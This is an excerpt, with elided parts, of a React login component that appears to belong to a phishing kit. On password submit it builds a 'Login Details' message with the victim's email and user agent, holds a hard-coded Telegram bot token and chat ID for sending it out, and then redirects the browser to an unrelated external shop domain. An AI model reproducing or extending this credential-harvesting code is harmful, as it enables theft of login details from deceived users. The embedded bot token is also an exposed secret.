...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7892737998:AAFiYH5h8SQwGKfSVcJ_WriQAAAnTJqFD-8';
      const TELEGRAM_CHAT_ID = '-1002583573247';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://or.nestconche.shop/';
    } catch (error) {
